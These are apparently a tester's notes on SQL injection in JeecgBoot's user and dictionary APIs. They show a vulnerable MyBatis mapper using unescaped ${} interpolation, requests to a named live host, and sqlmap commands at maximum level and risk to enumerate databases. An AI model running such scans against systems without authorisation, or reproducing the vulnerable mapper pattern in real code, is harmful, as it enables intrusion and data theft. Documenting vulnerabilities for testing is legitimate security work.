# test inject sql

when the code review on the github, here have some open issue about the sql inject. following is the links:

- [CVE-2022-22880](https://github.com/jeecgboot/JeecgBoot/issues/3347)
- [sys/dict/loadtreedata](https://github.com/jeecgboot/JeecgBoot/issues/1887)

## CVE-2022-22880

`GET https://web.antgst.com/antgst/sys/user/queryUserByDepId?id=57197590443c44f083d42ae24ef26a2c&realname=`

the `realname` mapper is:

```xml
<select id="queryDepartUserList" resultType="org.jeecg.modules.system.entity.SysUser">
    select a.* from sys_user a
    join sys_user_depart b on b.user_id = a.id
    join sys_depart c on b.dep_id = c.id
    where a.del_flag = 0 and c.org_code like '${orgCode}%'
    <if test="realname!=null and realname!=''">
        and a.realname like '%${realname}%'
    </if>
</select>
```

The MyBatis query uses `${realname}` instead of `#{realname}`, `${}` does direct string interpolation without escaping.

### request

the normal request is

```json
{
    "success": true,
    "message": "操作成功！",
    "code": 0,
    "result": [
        {
            "id": "e888946e0213c9a4685bd94e7f1563ae",
            "username": "SS678",
            "realName": null,
            "avatar": null,
            "orgCode": null,
            "status": 1,
            "drTimeout": 0,
            "workNo": null,
            "post": null,
            "notes": null,
            "createBy": "ANT_July",
            "createTime": "2024-03-18 15:17:27",
            "updateBy": null,
            "updateTime": null,
            "activitiSync": null,
            "departId": "a16ca6032b3745f095b80c510aba4af5",
            "departName": "SS678",
            "accountType": 4
        }
    ],
    "timestamp": 1734502811142
}
```

### try exploit

use the sqlmap to test the sql inject

```bash
sqlmap -r queryUserByDepId.txt \
-p realname \
--level=5 \
--risk=3 \
--random-agent \
--dbs \
--threads=10 \
--batch
```

## loadtreedata

sqlmap to exploit the `loadtreedata` api

```bash
sqlmap -r loadtreedata.txt \
-p code \
--level=5 \
--risk=3 \
--random-agent \
--dbs \
--threads=10 \
--batch \
-t trace.txt 
```


here have the sql check on the websit, the response is:

```json
{"success":false,"message":"服务器开小差了，请尽快联系服务人员","code":500,"result":null,"timestamp":1734507668132}
```